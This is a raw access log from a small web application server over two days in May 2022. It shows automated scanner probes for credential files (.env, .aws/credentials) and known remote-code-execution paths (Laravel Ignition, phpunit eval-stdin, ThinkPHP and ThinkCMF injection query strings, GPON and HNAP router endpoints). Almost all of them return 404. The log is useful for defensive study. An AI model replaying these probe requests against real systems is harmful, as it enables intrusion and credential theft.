[26/May/2022 14:22:50] "GET /public/.env HTTP/1.0" 404 1634
[26/May/2022 14:22:50] "POST / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:27] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:27] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 15:39:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[26/May/2022 16:30:17] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
[26/May/2022 16:37:19] "GET / HTTP/1.0" 302 0
[26/May/2022 16:37:22] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 16:37:23] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[26/May/2022 16:37:23] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[26/May/2022 16:37:23] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[26/May/2022 16:37:23] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[26/May/2022 16:37:23] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
Not Found: /sockjs-node
[26/May/2022 16:37:27] "GET /sockjs-node HTTP/1.0" 404 2181
[26/May/2022 16:37:28] "GET /api/authentication/getUser HTTP/1.0" 200 71
[26/May/2022 16:37:29] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[26/May/2022 16:37:29] "GET /public/assets/layout/images/logo-light.png HTTP/1.0" 200 2725
[26/May/2022 16:37:29] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[26/May/2022 16:37:29] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[26/May/2022 16:37:29] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[26/May/2022 16:37:30] "GET /admin/login?next=http%3A%2F%2F14.225.16.78%2Fpublic%2Findex.html%23%2F HTTP/1.0" 301 0
[26/May/2022 16:37:30] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[26/May/2022 16:37:30] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[26/May/2022 16:37:31] "GET /admin/login/?next=http%3A%2F%2F14.225.16.78%2Fpublic%2Findex.html%23%2F HTTP/1.0" 200 1897
[26/May/2022 16:37:31] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[26/May/2022 16:37:31] "GET /public/assets/layout/images/profile-image.png HTTP/1.0" 200 18199
[26/May/2022 16:37:31] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.0" 200 18199
[26/May/2022 16:37:32] "GET /public/static/js/main.chunk.js.map HTTP/1.0" 200 1196699
[26/May/2022 16:37:32] "GET /public/static/js/main.chunk.js.map HTTP/1.0" 200 1196699
[26/May/2022 16:37:33] "GET /public/static/js/main.chunk.js.map HTTP/1.0" 200 1196699
[26/May/2022 16:37:34] "GET /public/admin/css/login.css HTTP/1.0" 200 1233
[26/May/2022 16:37:34] "GET /public/admin/css/base.css HTTP/1.0" 200 16378
[26/May/2022 16:37:34] "GET /public/admin/css/responsive.css HTTP/1.0" 200 17944
[26/May/2022 16:37:34] "GET /public/admin/css/fonts.css HTTP/1.0" 200 423
[26/May/2022 16:37:35] "GET /public/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.0" 200 85876
[26/May/2022 16:37:35] "GET /public/admin/fonts/Roboto-Light-webfont.woff HTTP/1.0" 200 85692
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[26/May/2022 17:20:55] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[26/May/2022 17:31:16] "HEAD / HTTP/1.0" 302 0
[26/May/2022 17:35:01] "GET / HTTP/1.0" 302 0
[26/May/2022 17:35:02] "GET / HTTP/1.0" 302 0
[26/May/2022 17:35:02] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 17:35:02] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 17:35:02] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[26/May/2022 17:35:02] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[26/May/2022 17:35:03] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[26/May/2022 17:35:03] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[26/May/2022 17:35:03] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[26/May/2022 17:35:03] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[26/May/2022 17:35:03] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[26/May/2022 17:35:03] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[26/May/2022 17:35:03] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[26/May/2022 17:35:03] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
Not Found: /solr/admin/info/system
[26/May/2022 17:44:05] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
Not Found: /.aws/credentials
[26/May/2022 17:45:19] "GET /.aws/credentials HTTP/1.0" 404 2196
[26/May/2022 17:54:07] "GET / HTTP/1.0" 302 0
[26/May/2022 18:02:22] "GET / HTTP/1.0" 302 0
[26/May/2022 18:08:21] "GET / HTTP/1.0" 302 0
[26/May/2022 18:08:22] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 18:08:22] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[26/May/2022 18:08:22] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[26/May/2022 18:08:22] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[26/May/2022 18:08:22] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[26/May/2022 18:08:22] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
Not Found: /.env
[26/May/2022 18:25:41] "GET /.env HTTP/1.0" 404 2160
Not Found: /index.php
[26/May/2022 18:26:13] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[26/May/2022 18:32:06] "GET / HTTP/1.0" 302 0
[26/May/2022 18:32:06] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 18:42:06] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[26/May/2022 18:42:10] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 18:43:46] "GET / HTTP/1.0" 302 0
Not Found: /sqlmanager/index.php
[26/May/2022 18:45:52] "GET /sqlmanager/index.php?lang=en HTTP/1.0" 404 2216
Not Found: /phpmyadmin2018/index.php
[26/May/2022 18:45:52] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.0" 404 2228
Not Found: /PMA/index.php
[26/May/2022 18:45:52] "GET /PMA/index.php?lang=en HTTP/1.0" 404 2195
Not Found: /mysql/index.php
[26/May/2022 18:45:53] "GET /mysql/index.php?lang=en HTTP/1.0" 404 2201
Not Found: /phpmy/index.php
[26/May/2022 18:45:53] "GET /phpmy/index.php?lang=en HTTP/1.0" 404 2201
Not Found: /administrator/pma/index.php
[26/May/2022 18:45:53] "GET /administrator/pma/index.php?lang=en HTTP/1.0" 404 2237
Not Found: /phpMyAdmin-5.2.0/index.php
[26/May/2022 18:45:53] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.0" 404 2234
[26/May/2022 19:17:16] "GET / HTTP/1.0" 302 0
[26/May/2022 19:31:21] "GET / HTTP/1.0" 302 0
[26/May/2022 19:33:19] "GET / HTTP/1.0" 302 0
[26/May/2022 19:33:19] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 19:38:26] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[26/May/2022 19:38:30] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /console/
[26/May/2022 19:57:27] "GET /console/ HTTP/1.0" 404 2172
[26/May/2022 20:43:39] "GET / HTTP/1.0" 302 0
Not Found: /Autodiscover/Autodiscover.xml
[26/May/2022 20:48:31] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /.env
[26/May/2022 20:55:59] "GET /.env HTTP/1.0" 404 2160
[26/May/2022 20:56:00] "POST / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[26/May/2022 21:03:27] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 21:09:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[26/May/2022 21:12:39] "GET / HTTP/1.0" 302 0
Not Found: /GponForm/diag_Form
[26/May/2022 21:16:54] "POST /GponForm/diag_Form?images/ HTTP/1.0" 404 2208
[26/May/2022 21:38:58] "GET / HTTP/1.0" 302 0
Not Found: /users/sign_in
[26/May/2022 22:00:41] "GET /users/sign_in HTTP/1.0" 404 2187
[26/May/2022 22:02:16] "GET / HTTP/1.0" 302 0
[26/May/2022 22:02:24] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 22:12:57] "GET / HTTP/1.0" 302 0
[26/May/2022 22:38:56] "GET / HTTP/1.0" 302 0
[26/May/2022 22:39:06] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 23:13:57] "GET / HTTP/1.0" 302 0
[26/May/2022 23:27:15] "GET / HTTP/1.0" 302 0
[26/May/2022 23:32:44] "GET / HTTP/1.0" 302 0
Not Found: /actuator/gateway/routes
[26/May/2022 23:36:03] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
[26/May/2022 23:42:21] "GET / HTTP/1.0" 302 0
[27/May/2022 00:34:17] "GET / HTTP/1.0" 302 0
[27/May/2022 00:42:13] "GET / HTTP/1.0" 302 0
[27/May/2022 01:08:22] "GET / HTTP/1.0" 302 0
[27/May/2022 01:08:22] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 01:40:55] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[27/May/2022 01:40:56] "POST /HNAP1/ HTTP/1.0" 404 2167
[27/May/2022 01:52:39] "GET / HTTP/1.0" 302 0
[27/May/2022 01:52:40] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /HNAP1/
[27/May/2022 01:52:40] "GET /HNAP1/ HTTP/1.0" 404 2166
Not Found: /.env
[27/May/2022 02:39:22] "GET /.env HTTP/1.0" 404 2160
Not Found: /admin/.env
[27/May/2022 02:39:23] "GET /admin/.env HTTP/1.0" 404 3910
Not Found: /admin-app/.env
[27/May/2022 02:39:24] "GET /admin-app/.env HTTP/1.0" 404 2190
Not Found: /api/.env
[27/May/2022 02:39:25] "GET /api/.env HTTP/1.0" 404 2260
[27/May/2022 02:49:29] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 02:53:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[27/May/2022 03:07:33] "HEAD / HTTP/1.0" 302 0
[27/May/2022 03:07:33] "HEAD /public/index.html HTTP/1.0" 200 2139
[27/May/2022 03:07:36] "GET / HTTP/1.0" 302 0
[27/May/2022 03:07:36] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 03:09:21] "GET / HTTP/1.0" 302 0
[27/May/2022 03:15:32] "GET / HTTP/1.0" 302 0
[27/May/2022 03:19:55] "GET / HTTP/1.0" 302 0
[27/May/2022 03:19:55] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 04:54:05] "GET / HTTP/1.0" 302 0
[27/May/2022 05:25:29] "GET / HTTP/1.0" 302 0
[27/May/2022 05:25:29] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 07:24:14] "GET / HTTP/1.0" 302 0
[27/May/2022 07:39:06] "GET / HTTP/1.0" 302 0
[27/May/2022 07:47:13] "GET / HTTP/1.0" 302 0
[27/May/2022 08:49:15] "GET / HTTP/1.0" 302 0
[27/May/2022 08:57:37] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:56] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:59] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 09:09:59] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /.env
[27/May/2022 09:29:20] "GET /.env HTTP/1.0" 404 2160
[27/May/2022 09:29:21] "POST / HTTP/1.0" 302 0
Not Found: /ReportServer
[27/May/2022 09:38:52] "GET /ReportServer HTTP/1.0" 404 2184
[27/May/2022 09:54:53] "GET / HTTP/1.0" 302 0
[27/May/2022 09:54:54] "GET / HTTP/1.0" 302 0
[27/May/2022 09:54:54] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[27/May/2022 10:04:23] "GET /.env HTTP/1.0" 404 2160
[27/May/2022 10:04:23] "POST / HTTP/1.0" 302 0
[27/May/2022 10:26:08] "GET / HTTP/1.0" 302 0
Not Found: /.env
[27/May/2022 10:43:30] "GET /.env HTTP/1.0" 404 2160
[27/May/2022 11:27:33] "GET / HTTP/1.0" 302 0
[27/May/2022 11:27:33] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 11:35:20] "GET / HTTP/1.0" 302 0
[27/May/2022 11:40:33] "GET / HTTP/1.0" 302 0
[27/May/2022 11:56:22] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[27/May/2022 11:56:23] "POST /HNAP1/ HTTP/1.0" 404 2167
Not Found: /.env
[27/May/2022 12:01:53] "GET /.env HTTP/1.0" 404 2160
[27/May/2022 12:10:39] "GET / HTTP/1.0" 302 0
[27/May/2022 12:10:39] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[27/May/2022 13:16:56] "GET /.env HTTP/1.0" 404 2160
Not Found: /vendor/.env
[27/May/2022 13:16:57] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /storage/.env
[27/May/2022 13:16:57] "GET /storage/.env HTTP/1.0" 404 2184
[27/May/2022 13:16:58] "GET /public/.env HTTP/1.0" 404 1634
[27/May/2022 13:16:58] "POST / HTTP/1.0" 302 0
[27/May/2022 13:35:58] "HEAD / HTTP/1.0" 302 0
[27/May/2022 13:35:58] "HEAD /public/index.html HTTP/1.0" 200 2139
[27/May/2022 13:36:11] "GET / HTTP/1.0" 302 0
[27/May/2022 13:36:12] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 13:47:10] "GET / HTTP/1.0" 302 0
[27/May/2022 13:47:10] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[27/May/2022 14:01:01] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /.env
[27/May/2022 14:32:44] "GET /.env HTTP/1.0" 404 2160
[27/May/2022 14:32:44] "POST / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[27/May/2022 14:33:14] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[27/May/2022 14:37:27] "GET / HTTP/1.0" 302 0
[27/May/2022 14:37:27] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /solr/admin/info/system
[27/May/2022 14:52:34] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
Not Found: /index.php
[27/May/2022 15:22:28] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[27/May/2022 15:23:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[27/May/2022 15:24:17] "GET / HTTP/1.0" 302 0
[27/May/2022 16:04:55] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[27/May/2022 16:04:57] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 16:18:35] "GET / HTTP/1.0" 302 0
[27/May/2022 16:31:32] "GET / HTTP/1.0" 302 0
[27/May/2022 16:31:33] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 16:37:03] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[27/May/2022 16:37:20] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 16:39:04] "GET / HTTP/1.0" 302 0
[27/May/2022 16:39:04] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /console/
[27/May/2022 17:10:15] "GET /console/ HTTP/1.0" 404 2172
Not Found: /Autodiscover/Autodiscover.xml
[27/May/2022 17:25:27] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /cdn-cgi/trace
[27/May/2022 17:39:57] "GET /cdn-cgi/trace HTTP/1.0" 404 2189
Not Found: /_ignition/execute-solution
[27/May/2022 18:11:06] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[27/May/2022 18:27:40] "GET / HTTP/1.0" 302 0
[27/May/2022 18:27:43] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 18:57:29] "GET / HTTP/1.0" 302 0
[27/May/2022 18:57:29] "GET /public/index.html HTTP/1.0" 200 2139
[27/May/2022 19:05:19] "GET / HTTP/1.0" 302 0
Not Found: /.env
[27/May/2022 19:24:02] "GET /.env HTTP/1.0" 404 2160
Not Found: /conf/.env
[27/May/2022 19:24:02] "GET /conf/.env HTTP/1.0" 404 2175
Not Found: /wp-content/.env
[27/May/2022 19:24:02] "GET /wp-content/.env HTTP/1.0" 404 2193
Not Found: /wp-admin/.env
[27/May/2022 19:24:02] "GET /wp-admin/.env HTTP/1.0" 404 2187
Not Found: /library/.env
[27/May/2022 19:24:02] "GET /library/.env HTTP/1.0" 404 2184
Not Found: /new/.env
[27/May/2022 19:24:03] "GET /new/.env HTTP/1.0" 404 2172
Not Found: /vendor/.env
[27/May/2022 19:24:03] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /old/.env
[27/May/2022 19:24:03] "GET /old/.env HTTP/1.0" 404 2172
Not Found: /local/.env
[27/May/2022 19:24:03] "GET /local/.env HTTP/1.0" 404 2178
Not Found: /api/.env
[27/May/2022 19:24:03] "GET /api/.env HTTP/1.0" 404 2260
Not Found: /blog/.env
[27/May/2022 19:24:03] "GET /blog/.env HTTP/1.0" 404 2175
Not Found: /crm/.env
[27/May/2022 19:24:03] "GET /crm/.env HTTP/1.0" 404 2172
Not Found: /admin/.env
[27/May/2022 19:24:03] "GET /admin/.env HTTP/1.0" 404 3910
Not Found: /laravel/.env
[27/May/2022 19:24:03] "GET /laravel/.env HTTP/1.0" 404 2184
Not Found: /app/.env
[27/May/2022 19:24:03] "GET /app/.env HTTP/1.0" 404 2172
Not Found: /app/config/.env
[27/May/2022 19:24:04] "GET /app/config/.env HTTP/1.0" 404 2193
Not Found: /apps/.env
[27/May/2022 19:24:04] "GET /apps/.env HTTP/1.0" 404 2175
Not Found: /audio/.env
[27/May/2022 19:24:04] "GET /audio/.env HTTP/1.0" 404 2178
Not Found: /cgi-bin/.env
[27/May/2022 19:24:04] "GET /cgi-bin/.env HTTP/1.0" 404 2184
Not Found: /backend/.env
[27/May/2022 19:24:04] "GET /backend/.env HTTP/1.0" 404 2184
Not Found: /src/.env
[27/May/2022 19:24:04] "GET /src/.env HTTP/1.0" 404 2172
Not Found: /base/.env
[27/May/2022 19:24:04] "GET /base/.env HTTP/1.0" 404 2175
Not Found: /core/.env
[27/May/2022 19:24:04] "GET /core/.env HTTP/1.0" 404 2175
Not Found: /vendor/laravel/.env
[27/May/2022 19:24:04] "GET /vendor/laravel/.env HTTP/1.0" 404 2205
Not Found: /storage/.env
[27/May/2022 19:24:05] "GET /storage/.env HTTP/1.0" 404 2184
Not Found: /protected/.env
